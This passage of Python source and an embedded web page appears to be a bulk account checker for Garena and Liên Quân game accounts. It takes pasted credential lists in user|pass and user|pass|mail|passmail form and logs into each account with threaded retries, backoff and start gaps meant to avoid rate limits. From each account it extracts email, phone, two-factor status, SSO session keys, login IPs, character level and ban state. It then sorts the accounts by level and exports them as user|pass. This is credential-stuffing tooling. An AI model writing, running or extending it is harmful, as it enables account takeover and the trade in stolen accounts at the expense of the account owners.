            "stage": "tcp_sso_probe_oauth",
            "error": None if player_api.get("ok") else str(oauth_chain.get("error") or "kientuong_probe_failed"),
        }

    kientuong_complete = kientuong_player_has_level(player_api)

    if not kientuong_complete:
        kientuong_timeout = 5.0
        kientuong_params = {
            "client_id": "100054",
            "redirect_uri": "https://kientuong.lienquan.garena.vn/auth/login/callback",
            "response_type": "code",
            "platform": "3",
            "locale": "vi-VN",
        }

        kientuong_session = WebSession(kientuong_timeout)
        kientuong_oauth_ready = False
        kientuong_auth: dict[str, Any] = results["web_auth"].get("kientuong") or {}

        def _do_kientuong() -> tuple[dict[str, Any], dict[str, Any]]:
            nonlocal kientuong_auth, kientuong_oauth_ready
            if not kientuong_oauth_ready:
                kientuong_auth, _ = kientuong_session.oauth_callback(
                    account, password, kientuong_params, ensure_login=False
                )
                kientuong_auth.pop("_callback_values", None)
                if not kientuong_auth.get("ok"):
                    return kientuong_auth, {
                        "ok": False,
                        "error": api_failure_text(kientuong_auth, "kientuong_failed"),
                    }
                kientuong_oauth_ready = True
            wp = kientuong_session.api_result(
                "https://kientuong.lienquan.garena.vn/api/player/get",
                headers={"Referer": "https://kientuong.lienquan.garena.vn/"},
            )
            if not wp.get("ok"):
                wp["error"] = api_failure_text(wp, "kientuong_failed")
            return kientuong_auth, wp

        # Count player calls already made through the TCP SSO session so every
        # path stays within one initial attempt plus two retries.
        try:
            kientuong_attempts = int(oauth_chain.get("player_attempts") or 0)
        except (TypeError, ValueError):
            kientuong_attempts = 0
        kientuong_attempts = max(0, min(kientuong_attempts, KIENTUONG_MAX_ATTEMPTS))
        try:
            no_character_responses = int(oauth_chain.get("no_character_responses") or 0)
        except (TypeError, ValueError):
            no_character_responses = 0
        web_player = player_api or {"ok": False, "error": "kientuong_failed"}
        while (
            kientuong_attempts < KIENTUONG_MAX_ATTEMPTS
            and not kientuong_player_has_level(web_player)
            and no_character_responses < 2
        ):
            if kientuong_attempts:
                time.sleep(0.75)
            kientuong_attempts += 1
            try:
                kientuong_auth, web_player = _do_kientuong()
                if kientuong_no_character_response(web_player):
                    no_character_responses += 1
            except Exception as exc:
                timed_out = "Timeout" in type(exc).__name__ or "timed out" in str(exc).lower()
                error = "timeout 5s" if timed_out else (
                    str(exc).strip() or type(exc).__name__
                )[:500]
                kientuong_auth = {
                    "ok": False,
                    "stage": "kientuong_oauth",
                    "error": error,
                }
                web_player = {"ok": False, "error": error}

        kientuong_auth["attempts"] = kientuong_attempts
        kientuong_auth["max_retries"] = KIENTUONG_MAX_RETRIES
        kientuong_auth["retry_exhausted"] = bool(
            not kientuong_player_has_level(web_player)
            and kientuong_attempts >= KIENTUONG_MAX_ATTEMPTS
        )
        kientuong_auth["no_character_responses"] = no_character_responses
        kientuong_auth["no_character_confirmed"] = bool(no_character_responses >= 2)
        results["web_auth"]["kientuong"] = kientuong_auth
        results["apis"]["kientuong_player"] = web_player

    password = ""
    results["elapsed_ms"] = round((time.monotonic() - started) * 1000)
    return results


def format_user_output(result: dict[str, Any]) -> str:
    """Return only account and Kiện Tướng data on one ``||``-delimited line."""

    tcp = result.get("tcp") or {}
    if tcp.get("credential_rejected"):
        return (
            f"Tài khoản: {str(tcp.get('account') or 'không có')}"
            " || Trạng thái: FALSE || Lỗi: sai tài khoản hoặc mật khẩu (TCP từ chối)"
        )
    apis = result.get("apis") or {}
    web_auth = result.get("web_auth") or {}
    probe = result.get("tcp_to_web_probe") or {}
    account_body = (apis.get("account_init") or {}).get("body") or {}
    if not isinstance(account_body, dict) or not isinstance(account_body.get("user_info"), dict):
        account_body = (probe.get("account_init") or {}).get("body") or {}
    user_info = account_body.get("user_info") or {}
    if not isinstance(user_info, dict):
        user_info = {}

    def clean(value: Any, fallback: str = "không có") -> str:
        if value is None or value == "":
            return fallback
        return " ".join(str(value).replace("||", "｜｜").split())

    def yes_no(value: Any) -> str:
        if isinstance(value, str):
            normalized = value.strip().casefold()
            if normalized in {"1", "true", "yes", "on", "verified"}:
                return "Có"
            if normalized in {"0", "false", "no", "off", "unverified", ""}:
                return "Không"
        return "Có" if bool(value) else "Không"

    email = user_info.get("email")
    if not email:
        email_status = "Chưa liên kết"
    else:
        email_verified = next(
            (
                user_info[key]
                for key in ("email_v", "email_verified", "email_verify")
                if key in user_info
            ),
            None,
        )
        email_status = "Không rõ" if email_verified is None else (
            "Đã xác thực" if yes_no(email_verified) == "Có" else "Chưa xác thực"
        )

    def player_from(api_result: Any) -> tuple[dict[str, Any], dict[str, Any]]:
        body = api_result.get("body") if isinstance(api_result, dict) else {}
        if not isinstance(body, dict):
            return {}, {}
        payload = body.get("data") if isinstance(body.get("data"), dict) else body
        player = payload.get("player") if isinstance(payload, dict) else {}
        return (
            payload if isinstance(payload, dict) else {},
            player if isinstance(player, dict) else {},
        )

    oauth_chain = probe.get("account_to_kientuong_oauth") or {}
    kientuong_result = apis.get("kientuong_player") or {}
    kientuong_payload, kientuong_player = player_from(kientuong_result)
    kientuong_checked = bool(kientuong_result.get("ok"))
    if not kientuong_player:
        probe_player_result = oauth_chain.get("player_api") or {}
        kientuong_payload, kientuong_player = player_from(probe_player_result)
        kientuong_checked = kientuong_checked or bool(probe_player_result.get("ok"))

    account_auth = web_auth.get("account_center") or {}
    session_key_display: Any = account_auth.get("session_key")
    if not session_key_display and tcp.get("web_sso_key"):
        session_key_display = f"{tcp['web_sso_key']} (lấy qua TCP)"
    login_search = account_auth.get("latest_lien_quan_login") or {}
    if not login_search:
        login_search = probe.get("latest_lien_quan_login") or {}
    latest_game_login = (
        login_search.get("entry")
        if isinstance(login_search, dict)
        and isinstance(login_search.get("entry"), dict)
        else None
    )

    fields: list[tuple[str, Any, str]] = [
        ("Tài khoản", user_info.get("username") or tcp.get("account"), "không có"),
        ("UID Garena", user_info.get("uid") or tcp.get("uid"), "không có"),
        ("Email", email, "chưa liên kết"),
        ("Xác thực email", email_status, "Không rõ"),
        ("Số điện thoại", user_info.get("mobile_no"), "chưa liên kết"),
        ("Xác thực 2 bước", yes_no(user_info.get("two_step_verify_enable")), "Không"),
        ("Authenticator", yes_no(user_info.get("authenticator_enable")), "Không"),
        ("Session Key SSO", session_key_display, "không lấy được"),
    ]

    if latest_game_login:
        fields.extend(
            [
                (
                    "Đăng nhập Liên Quân gần nhất",
                    format_login_timestamp(latest_game_login.get("timestamp")),
                    "không rõ",
                ),
                ("IP đăng nhập", latest_game_login.get("ip"), "không có"),
            ]
        )
    elif isinstance(login_search, dict) and login_search.get("history_exhausted"):
        fields.append(("Đăng nhập Liên Quân gần nhất", "OFF trên 1 tháng", "OFF trên 1 tháng"))
    else:
        fields.append(("Đăng nhập Liên Quân gần nhất", "Không đọc hết lịch sử", "Không đọc hết lịch sử"))

    if kientuong_player:
        game_id = (
            kientuong_player.get("id")
            or kientuong_player.get("uid")
            or kientuong_player.get("openId")
        )
        game_uid = kientuong_player.get("uid") or kientuong_player.get("openId")
        fields.extend(
            [
                ("Tên Kiện Tướng", kientuong_player.get("name"), "không có"),
                ("Cấp độ", kientuong_player.get("level"), "không có"),
                (
                    "Trạng thái Kiện Tướng",
                    "Bị khóa" if bool(kientuong_player.get("banInfo")) else "Bình thường",
                    "không rõ",
                ),
            ]
        )
        if game_id is not None and str(game_id) != "":
            fields.append(("ID Kiện Tướng", game_id, "không có"))
        if game_uid is not None and str(game_uid) != str(game_id):
            fields.append(("UID/OpenID game", game_uid, "không có"))
        deletion_status = kientuong_payload.get("playerStatus")
        if deletion_status:
            deletion_labels = {
                "NO_DELETION_REQUEST": "Không có yêu cầu xóa",
                "DELETION_REQUESTED": "Đang chờ xóa",
                "DELETION_COMPLETED": "Đã xóa",
            }
            fields.append(
                (
                    "Yêu cầu xóa Kiện Tướng",
                    deletion_labels.get(str(deletion_status), deletion_status),
                    "không rõ",
                )
            )
    elif kientuong_checked:
        fields.append(("Kiện Tướng", "Chưa tạo nhân vật", "Chưa tạo nhân vật"))
    else:
        kientuong_auth = web_auth.get("kientuong") or {}
        error = api_failure_text(
            kientuong_result,
            api_failure_text(kientuong_auth, "kientuong_failed"),
        )
        attempts = int(kientuong_auth.get("attempts") or 0)
        retry_note = f" sau {attempts} lần kiểm tra" if attempts else ""
        fields.append(("Kiện Tướng", f"Lỗi {error}{retry_note}", "kientuong_failed"))

    return " || ".join(
        f"{label}: {clean(value, fallback)}" for label, value, fallback in fields
    )


@dataclass(slots=True)
class BatchAccount:
    index: int
    account: str
    password: str


def batch_yes_no(value: Any) -> str:
    if isinstance(value, str):
        normalized = value.strip().casefold()
        if normalized in {"1", "true", "yes", "on", "verified"}:
            return "Có"
        if normalized in {"0", "false", "no", "off", "unverified", ""}:
            return "Không"
    return "Có" if bool(value) else "Không"


def mask_batch_session_key(value: Any, visible: int = 8) -> str:
    text = str(value or "")
    if not text:
        return ""
    return text if len(text) <= visible else f"{text[:visible]}..."


BATCH_FIELDNAMES = [
    "stt", "account", "status", "uid",
    "name", "level", "player_status", "result_type", "elapsed_ms",
]


def public_batch_row(row: dict[str, Any]) -> dict[str, str]:
    """Return only fields safe for UI, CSV, history APIs and persistence."""

    return {field: str(row.get(field, "") or "") for field in BATCH_FIELDNAMES}

REQUIRED_ACCOUNT_LABEL = "hồ sơ tài khoản"
REQUIRED_SESSION_LABEL = "session_key"
REQUIRED_KIENTUONG_LABEL = "Kiện Tướng"

MAX_EMPTY_ATTEMPTS = 8
BATCH_ROW_DEADLINE_SECONDS = 90.0
BATCH_MAX_REQUEST_TIMEOUT = 8.0


def batch_login_rejected_permanently(result: Any) -> bool:
    """An explicit TCP rejection is the final wrong-password decision."""

    if not isinstance(result, dict):
        return False
    return bool((result.get("tcp") or {}).get("credential_rejected"))


def batch_required_missing(result: Any) -> list[str]:
    """Chi can Kien Tuong - Ctnv hoac co level moi la du."""

    if not isinstance(result, dict):
        return [REQUIRED_KIENTUONG_LABEL]
    apis = result.get("apis") or {}
    probe = result.get("tcp_to_web_probe") or {}
    web_auth = result.get("web_auth") or {}

    oauth_chain = probe.get("account_to_kientuong_oauth") or {}
    kientuong_api = apis.get("kientuong_player") or {}
    probe_player = (
        oauth_chain.get("player_api")
        if isinstance(oauth_chain.get("player_api"), dict)
        else {}
    )

    # Co level => du
    if kientuong_player_has_level(kientuong_api) or kientuong_player_has_level(probe_player):
        return []
    # Ok (du 200) => du, se xu ly Ctnv o succeeded
    if kientuong_api.get("ok") or probe_player.get("ok"):
        return []
    # Ctnv da xac nhan => du
    k_auth = web_auth.get("kientuong") or {}
    if k_auth.get("no_character_confirmed"):
        return []
    # Probe player chua co level nhung da co body chua player rỗng -> can kiem tra lai level
    # Chi yeu cau Kien Tuong khi chua co ket luan
    return [REQUIRED_KIENTUONG_LABEL]


def parse_credentials_text(text: str) -> list[BatchAccount]:
    accounts: list[BatchAccount] = []
    for line_number, raw_line in enumerate(text.splitlines(), 1):
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        if "|" in line:
            parts = line.split("|")
            if len(parts) < 2:
                raise ValueError(f"Dòng {line_number}: cần định dạng user|pass, user|pass|mail hoặc user|pass|mail|passmail (hoặc user:pass)")
            account = parts[0].strip()
            password = parts[1].strip()
        elif line.count(":") == 1:
            account, password = line.split(":", 1)
            account = account.strip()
            password = password.strip()
        else:
            raise ValueError(f"Dòng {line_number}: cần định dạng user|pass, user|pass|mail hoặc user|pass|mail|passmail (hoặc user:pass)")
        if not account or not password or len(account) > 128 or len(password) > 1024:
            raise ValueError(f"Dòng {line_number}: tài khoản/mật khẩu không hợp lệ")
        accounts.append(BatchAccount(len(accounts) + 1, account, password))
        if len(accounts) >= MAX_BATCH_ACCOUNTS:
            break
    if not accounts:
        raise ValueError("Danh sách trống hoặc không có dòng hợp lệ")
    return accounts


def batch_check_one(
    credential: Any,
    tcp_module: Any,
    timeout: float,
    gate: Any,
    stop_event: threading.Event,
) -> dict[str, str]:
    started = time.monotonic()
    input_account = str(getattr(credential, "account", ""))
    account_info_found = False
    kientuong_info_found = False
    row = {
        "stt": str(getattr(credential, "index", "")),
        "account": getattr(credential, "account", ""),
        "status": "FAIL",
        "uid": "",
        "email": "",
        "email_status": "",
        "mobile": "",
        "two_step": "",
        "authenticator": "",
        "latest_login": "",
        "login_ip": "",
        "name": "",
        "level": "",
        "player_status": "",
        "deletion_status": "",
        "session_key": "",
        "elapsed_ms": "0",
        "result_type": "",
        "error": "",
        "_credential": f"{input_account}|{credential.password}",
        "_special": "",
    }
    if not gate.wait(stop_event):
        credential.password = ""
        row.pop("error", None)
        return row
    result: dict[str, Any] | None = None
    attempt_count = 0
    attempt_error = ""
    retry_stopped = False
    login_rejected = False
    gave_up_reason = ""
    has_partial = False
    empty_reads = 0
    missing: list[str] = []
    effective_timeout = min(float(timeout), BATCH_MAX_REQUEST_TIMEOUT)
    while True:
        attempt_count += 1
        print(f"  [{credential.index}] #{credential.account[:20]} attempt {attempt_count}", flush=True)
        try:
            current_result = run_api_tests(
                tcp_module, credential.account, credential.password, effective_timeout
            )
        except Exception as exc:
            attempt_error = (str(exc).strip() or type(exc).__name__)[:220]
            if not has_partial:
                empty_reads += 1
        else:
            result = current_result
            attempt_error = ""
            missing = batch_required_missing(current_result)
            if batch_login_rejected_permanently(current_result):
                login_rejected = True
                break
            # Co UID la pass dung - chi dung khi Kien Tuong da co ket luan Ctnv hoac level
            tcp_ok = bool((current_result.get("tcp") or {}).get("ok"))
            if tcp_ok and not missing:
                break
            if not missing:
                break
            if len(missing) < 3:
                has_partial = True
                empty_reads = 0
            elif not has_partial:
                empty_reads += 1
        if not has_partial:
            if empty_reads >= MAX_EMPTY_ATTEMPTS:
                gave_up_reason = (
                    f"{MAX_EMPTY_ATTEMPTS} lần thử đều không đọc được dữ liệu nào"
                )
                break
            if time.monotonic() - started >= BATCH_ROW_DEADLINE_SECONDS:
                gave_up_reason = (
                    f"quá {BATCH_ROW_DEADLINE_SECONDS:.0f}s không đọc được dữ liệu nào"
                )
                break
        backoff = min(1.5 * attempt_count, 8.0)
        # FAIL nhanh (< 500ms) thường là rate limit/connection - đợi lâu hơn
        elapsed_so_far = time.monotonic() - started
        if elapsed_so_far < 0.5 * attempt_count:
            backoff = max(backoff, 3.0)
        if stop_event.wait(backoff) or not gate.wait(stop_event):
            retry_stopped = True
            break

    if result is None:
        row["error"] = attempt_error or (
            "đã dừng trước lần kiểm tra lại" if retry_stopped else "không có kết quả kiểm tra"
        )
        if attempt_count:
            row["error"] = f"{row['error']}; đã kiểm tra {attempt_count} lần"
    else:
        apis = result.get("apis") or {}
        web_auth = result.get("web_auth") or {}
        tcp_info = result.get("tcp") or {}
        account_auth = web_auth.get("account_center") or {}
        init_api = apis.get("account_init") or {}
        kientuong_api = apis.get("kientuong_player") or {}
        probe = result.get("tcp_to_web_probe") or {}
        oauth_chain = probe.get("account_to_kientuong_oauth") or {}

        init_body = init_api.get("body") if isinstance(init_api.get("body"), dict) else {}
        user_info = init_body.get("user_info") if isinstance(init_body.get("user_info"), dict) else {}
        probe_init_result = probe.get("account_init") or {}
        probe_init_body = (
            probe_init_result.get("body")
            if isinstance(probe_init_result.get("body"), dict)
            else {}
        )
        if not user_info and isinstance(probe_init_body.get("user_info"), dict):
            user_info = probe_init_body.get("user_info") or {}
        account_info_found = bool(user_info)

        probe_player = (
            oauth_chain.get("player_api")
            if isinstance(oauth_chain.get("player_api"), dict)
            else {}
        )
        player_source = kientuong_api
        if not player_source.get("ok") and probe_player.get("ok"):
            player_source = probe_player
        kientuong_body = (
            player_source.get("body") if isinstance(player_source.get("body"), dict) else {}
        )
        payload = (
            kientuong_body.get("data")
            if isinstance(kientuong_body.get("data"), dict)
            else kientuong_body
        )
        player = payload.get("player") if isinstance(payload.get("player"), dict) else {}
        kientuong_info_found = bool(player)

        email = user_info.get("email")
        email_status = ""
        if user_info and not email:
            email_status = "Chưa liên kết"
        elif user_info:
            email_verified = next(
                (
                    user_info[key]
                    for key in ("email_v", "email_verified", "email_verify")
                    if key in user_info
                ),
                None,
            )
            email_status = (
                "Không rõ"
                if email_verified is None
                else ("Đã xác thực" if batch_yes_no(email_verified) == "Có" else "Chưa xác thực")
            )

        login_search = account_auth.get("latest_lien_quan_login") or {}
        if not login_search:
            login_search = probe.get("latest_lien_quan_login") or {}
        latest_game_login = (
            login_search.get("entry")
            if isinstance(login_search, dict)
            and isinstance(login_search.get("entry"), dict)
            else {}
        )

        deletion_labels = {
            "NO_DELETION_REQUEST": "Không có yêu cầu xóa",
            "DELETION_REQUESTED": "Đang chờ xóa",
            "DELETION_COMPLETED": "Đã xóa",
        }
        deletion_status = payload.get("playerStatus") if isinstance(payload, dict) else None

        row["account"] = str(user_info.get("username") or row["account"])
        row["uid"] = str(user_info.get("uid") or tcp_info.get("uid") or "")
        if user_info:
            row["email"] = str(email or "")
            row["email_status"] = email_status
            row["mobile"] = str(user_info.get("mobile_no") or "")
            row["two_step"] = batch_yes_no(user_info.get("two_step_verify_enable"))
            row["authenticator"] = batch_yes_no(user_info.get("authenticator_enable"))
        if latest_game_login:
            row["latest_login"] = format_login_timestamp(latest_game_login.get("timestamp"))
            row["login_ip"] = str(latest_game_login.get("ip") or "")
        elif isinstance(login_search, dict) and login_search.get("history_exhausted"):
            row["latest_login"] = "OFF trên 1 tháng"
        row["name"] = str(player.get("name") or "")
        row["level"] = str(player.get("level") or "")
        row["player_status"] = (
            "Bị khóa" if bool(player.get("banInfo")) else "Bình thường"
        ) if player else ""
        row["deletion_status"] = str(
            deletion_labels.get(str(deletion_status), deletion_status or "")
        )
        session_key = str(account_auth.get("session_key") or "")
        if not session_key and tcp_info.get("web_sso_key"):
            session_key = str(tcp_info.get("web_sso_key"))
        row["session_key"] = mask_batch_session_key(session_key)

        kientuong_ok = bool(kientuong_api.get("ok") or probe_player.get("ok"))
        kientuong_auth = web_auth.get("kientuong") or {}
        no_character_confirmed = bool(kientuong_auth.get("no_character_confirmed"))
        if no_character_confirmed and not player:
            row["player_status"] = "Chưa tạo nhân vật"
        if not row["level"] and no_character_confirmed:
            row["level"] = "Ctnv"
        errors: list[str] = []
        if not login_rejected and not kientuong_ok:
            kt_err = str(
                kientuong_api.get("error")
                or kientuong_auth.get("error")
                or "kientuong_failed"
            )
            errors.append(kt_err)
        if tcp_info.get("error"):
            errors.append(str(tcp_info.get("error")))
        if attempt_error:
            errors.append(attempt_error)
        if retry_stopped:
            errors.append("đã dừng trước lần kiểm tra lại")
        # Dung pass (co UID) thi khong bao gio FAIL - chi sai pass moi FAIL
        tcp_ok = bool(tcp_info.get("ok"))
        succeeded = tcp_ok
        row["status"] = "OK" if succeeded else "FAIL"
        if login_rejected:
            errors.insert(
                0,
                "FALSE - sai tài khoản hoặc mật khẩu (TCP từ chối), dừng ngay",
            )
            row["status"] = "FAIL"
            row["result_type"] = "Sai pass"
        elif gave_up_reason and not tcp_ok:
            errors.insert(
                0,
                gave_up_reason
                + " — nghi sai pass hoặc tài khoản có vấn đề, xin tự kiểm tra",
            )
            row["status"] = "FAIL"
        elif missing:
            reportable_missing = [
                item
                for item in missing
                if not (item == REQUIRED_KIENTUONG_LABEL and row["level"] == "Ctnv")
            ]
            if reportable_missing:
                errors.append(
                    "chưa đọc được: "
                    + ", ".join(reportable_missing)
                    + f" (sau {attempt_count} lần thử)"
                )
            if not tcp_info.get("ok") and reportable_missing:
                row["status"] = "FAIL"
        elif retry_stopped and row["status"] == "OK":
            errors.append(f"dừng sớm sau khi đủ dữ liệu, đã kiểm tra {attempt_count} lần")
        if row["status"] == "FAIL":
            errors.append(f"đã kiểm tra {attempt_count} lần")
        row["error"] = "; ".join(
            dict.fromkeys(e for e in errors if e and e != "None")
        )[:300]
    row["elapsed_ms"] = str(round((time.monotonic() - started) * 1000))
    if attempt_count and not kientuong_info_found:
        row["_special"] = "1"
    credential.password = ""
    # Error codes are internal retry diagnostics only; never expose or persist them.
    row.pop("error", None)
    return row


def run_batch_core(
    credentials: list[Any],
    tcp_module: Any,
    workers: int,
    gap: float,
    timeout: float,
    *,
    stop_event: threading.Event | None = None,
    on_result: Any = None,
) -> list[dict[str, str]]:
    import garena_tcp_rate_limit_probe as batch_helpers

    gate = batch_helpers.StartGate(max(0.0, gap))
    if stop_event is None:
        stop_event = threading.Event()
    rows: list[dict[str, str]] = []
    total = len(credentials)
    # Streaming: xong 1 acc la day acc tiep ngay, khong doi ca chunk
    with ThreadPoolExecutor(max_workers=max(1, int(workers)), thread_name_prefix="sso-batch") as executor:
        futures = [
            executor.submit(batch_check_one, credential, tcp_module, timeout, gate, stop_event)
            for credential in credentials
        ]
        for future in as_completed(futures):
            if stop_event.is_set():
                for f in futures:
                    f.cancel()
                break
            try:
                row = future.result()
            except Exception:
                row = {"stt": "-", "account": "-", "status": "FAIL"}
            rows.append(row)
            done = len(rows)
            if done % 50 == 0 or done == total:
                print(f"[batch] {done}/{total} done", flush=True)
            if on_result is not None:
                on_result(row)
    return rows


def _batch_worker(
    server: Any,
    credentials: list[BatchAccount],
    workers: int,
    gap: float,
) -> None:
    saved_count = 0

    def on_result(row: dict[str, str]) -> None:
        nonlocal saved_count
        with server.batch_lock:
            server.batch_rows.append(row)
            current_count = len(server.batch_rows)
        if current_count - saved_count >= 50:
            try:
                with server.batch_lock:
                    db.save_batch(list(server.batch_rows), getattr(server, 'batch_required_level', 12))
                saved_count = current_count
            except Exception as exc:
                print(f"[db] save error: {exc}", flush=True)

    try:
        run_batch_core(
            credentials,
            server.tcp_module,
            workers,
            gap,
            server.tcp_timeout,
            stop_event=server.batch_stopped,
            on_result=on_result,
        )
    except Exception as exc:
        print(f"[batch] worker error: {exc}", flush=True)
        traceback.print_exc()
        with server.batch_lock:
            server.batch_rows.append({
                "stt": "-", "account": "-", "status": "FAIL", "uid": "", "name": "",
                "level": "", "session_key": "", "elapsed_ms": "",
            })
    finally:
        for credential in credentials:
            credential.password = ""
        with server.batch_lock:
            if server.batch_started_at:
                server.batch_elapsed_ms = round(
                    (time.monotonic() - server.batch_started_at) * 1000
                )
            server.batch_running = False
            try:
                db.save_batch(list(server.batch_rows), getattr(server, 'batch_required_level', 12))
                print(f"[db] saved final: {len(server.batch_rows)} rows", flush=True)
            except Exception as exc:
                print(f"[db] final save error: {exc}", flush=True)


def run_batch(args: argparse.Namespace) -> int:
    import garena_tcp_rate_limit_probe as batch_helpers

    credentials = batch_helpers.load_credentials(args.file.resolve(), limit=1_000_000)
    tcp_module = tcp_ui.load_verified_tcp_module()

    print(
        f"Batch TCP chính + SSO web dự phòng: {len(credentials)} tài khoản | workers={args.workers} | "
        f"start_gap={max(0.0, args.start_gap):g}s | timeout={args.timeout:g}s"
    )
    print("|".join(field.upper() for field in BATCH_FIELDNAMES))

    def on_result(row: dict[str, str]) -> None:
        print(
            "|".join(
                str(row.get(field, "")).replace("|", "/").replace("\r", " ").replace("\n", " ")
                for field in BATCH_FIELDNAMES
            ),
            flush=True,
        )

    rows = run_batch_core(
        credentials, tcp_module, args.workers, args.start_gap, args.timeout,
        on_result=on_result,
    )

    ok_count = sum(1 for row in rows if row["status"] == "OK")
    print(
        f"SUMMARY|total={len(credentials)}|done={len(rows)}"
        f"|ok={ok_count}|fail={len(rows) - ok_count}"
    )

    if args.csv:
        with args.csv.open("w", encoding="utf-8-sig", newline="") as handle:
            writer = csv.DictWriter(handle, fieldnames=BATCH_FIELDNAMES)
            writer.writeheader()
            writer.writerows(
                public_batch_row(row)
                for row in sorted(rows, key=lambda item: int(item["stt"]))
            )
        print(f"Đã ghi kết quả: {args.csv}")
    return 0 if len(rows) == len(credentials) else 1


PAGE_TEMPLATE = r'''<!doctype html>
<html lang="vi"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Kiểm tra tài khoản Garena + Kiện Tướng</title><style>
:root{color-scheme:dark;font-family:Inter,Segoe UI,system-ui,sans-serif}body{margin:0;background:#0d1117;color:#e6edf3}
 main{width:min(1120px,calc(100vw - 16px));margin:14px auto;display:grid;gap:14px}
.card{background:#161b22;border:1px solid #21262d;border-radius:12px;padding:16px;box-shadow:0 1px 0 rgba(255,255,255,.03) inset}
h1{margin:0 0 6px;font-size:18px}h2{margin:0 0 8px;font-size:15px;color:#58a6ff}
p,small,label{color:#9da7b3;line-height:1.45;font-size:12.5px}
input,textarea{box-sizing:border-box;width:100%;padding:9px 11px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;border-radius:8px;outline:none;font-size:13px}
input:focus,textarea:focus{border-color:#2f81f7}
textarea{min-height:110px;resize:vertical;font-family:Consolas,monospace;font-size:12.5px}
button{margin-top:10px;padding:8px 13px;border:0;border-radius:8px;background:#238636;color:#fff;font-weight:650;cursor:pointer;font-size:13px;line-height:1}
button:disabled{opacity:.5;cursor:not-allowed}
button.warnb{background:#9e6a03}button.ghost{background:#21262d}
.btnfile{display:inline-block;margin-top:10px;padding:8px 13px;border-radius:8px;background:#21262d;color:#fff;font-weight:650;cursor:pointer;font-size:13px}
.row{display:flex;gap:10px;flex-wrap:wrap;margin-top:10px}.row>div{flex:1;min-width:120px}
#batchStatus{font-weight:650;margin-top:10px;font-size:13px}#batchStatus.bad,#result.bad{color:#ff7b72}#result.ok{color:#56d364}.fileinfo,#batchTiming{color:#9da7b3;margin:8px 0 0;font-size:12px}
 .wrap{max-height:460px;overflow:auto;border:1px solid #21262d;border-radius:10px;margin-top:10px;scrollbar-width:thin}
 table{width:100%;min-width:780px;border-collapse:collapse;font-size:12.5px;table-layout:auto}
 th,td{border-bottom:1px solid #21262d;padding:7px 10px;text-align:left;white-space:nowrap;vertical-align:middle}
th{color:#8b949e;position:sticky;top:0;background:#1c2128;font-weight:600;font-size:11px;letter-spacing:.03em;text-transform:uppercase;z-index:1}
tr:hover td{background:#1a1f27}
.badge{display:inline-block;padding:2px 8px;border-radius:999px;font-weight:700;font-size:11px;line-height:1.4}
tr.ok .badge{background:#1a7f37;color:#fff}tr.fail .badge{background:#da3633;color:#fff}
#out{white-space:pre-wrap;overflow-wrap:anywhere;background:#010409;border:1px solid #30363d;border-radius:8px;padding:12px;min-height:56px;margin-top:10px;font-size:12.5px}
</style></head><body><main>

<div class="card">
<h2>Kiểm tra hàng loạt (TCP chính + SSO web dự phòng)</h2>
<p>Dán danh sách <code>user|pass</code>, <code>user|pass|mail</code>, <code>user|pass|mail|passmail</code> hoặc <code>user:pass</code>, mỗi dòng một tài khoản. Chỉ dùng <code>user</code> và <code>pass</code> để kiểm tra, phần <code>mail</code>/ <code>passmail</code> sẽ bỏ qua. Dòng trống hoặc bắt đầu bằng <code>#</code> bị bỏ qua.</p>
<textarea id="batchAccounts" placeholder="user1|pass1&#10;user2|pass2|mail@example.com&#10;user3|pass3|mail|passmail&#10;user4:pass4"></textarea>
<div class="row">
<div><label>Số luồng (500MB RAM khuyên 5-8)</label><input id="batchWorkers" type="number" min="1" max="8" value="5"></div>
<div><label>Gap giữa 2 lần đăng nhập (giây, 0–60)</label><input id="batchGap" type="number" min="0" max="60" step="0.5" value="3"></div>
<div><label>Cấp độ yêu cầu</label><input id="requiredLevel" type="number" min="0" max="99" value="12"></div>
</div>
<button id="batchStart" type="button">Chạy batch</button>
<button id="batchStop" type="button" class="warnb">Dừng</button>
<button id="batchExport" type="button" class="ghost">Xuất CSV</button>
<button id="splitBtn" type="button" class="ghost">Chia lọc theo cấp độ</button>
<button id="exportXlsxBtn" type="button" class="ghost" disabled>Xuất XLSX 5 tab</button>
<label class="btnfile">Nhập file<input id="batchImport" type="file" accept=".txt,.csv,text/plain" hidden></label>
<div id="batchFileName" class="fileinfo">Chưa chọn file.</div>
<div id="batchStatus">Chưa chạy.</div>
<div id="batchTiming" class="fileinfo">Thời gian: chưa bắt đầu.</div>
<div class="wrap"><table><thead><tr><th>STT</th><th>Tài khoản</th><th>Trạng thái</th><th>UID Garena</th><th>Tên Kiện Tướng</th><th>Cấp</th><th>Trạng thái Kiện Tướng</th><th>ms</th></tr></thead>
<tbody id="batchBody"></tbody></table></div>
<small>Kết quả hiển thị trực tiếp khi từng tài khoản xong. TCP từ chối được kết luận ngay là sai tài khoản/mật khẩu; TCP trả UID được giữ là tài khoản đúng. Chỉ kiểm tra Kiện Tướng (bỏ qua hồ sơ Garena/email); Kiện Tướng chỉ thử lại tối đa 2 lần và chỉ ghi <code>Ctnv</code> khi API xác nhận phản hồi chưa tạo nhân vật lặp lại. Timeout hoặc lỗi OAuth không bị coi là chưa tạo nhân vật. XLSX có năm tab Đạt, Không đạt, Bị khóa, Đặc biệt và FAIL; cột Tài khoản trong cả năm tab có dạng <code>user|pass</code>. Bấm "Dừng" để kết thúc sớm.</small>

<div id="splitSection" style="display:none;margin-top:18px">
<h2 id="splitTitle" style="color:#58a6ff;margin:0 0 10px;font-size:16px"></h2>
<div style="display:flex;gap:18px;flex-wrap:wrap">
<div style="flex:1;min-width:300px">
<h3 style="color:#56d364;margin:0 0 8px;font-size:14px">✅ Đạt yêu cầu (<span id="metCount">0</span> acc)</h3>
<div class="wrap" style="max-height:360px"><table><thead><tr><th>STT</th><th>Tài khoản</th><th>Trạng thái</th><th>UID</th><th>Tên KT</th><th>Cấp</th><th>Trạng thái KT</th><th>ms</th></tr></thead>
<tbody id="metBody"></tbody></table></div>
</div>
<div style="flex:1;min-width:300px">
<h3 style="color:#ff7b72;margin:0 0 8px;font-size:14px">❌ Không đạt (<span id="notMetCount">0</span> acc)</h3>
<div class="wrap" style="max-height:360px"><table><thead><tr><th>STT</th><th>Tài khoản</th><th>Trạng thái</th><th>UID</th><th>Tên KT</th><th>Cấp</th><th>Trạng thái KT</th><th>ms</th></tr></thead>
<tbody id="notMetBody"></tbody></table></div>
</div>
</div>
</div>
</div>

<div class="card">
<h2>Kiểm tra lẻ</h2>
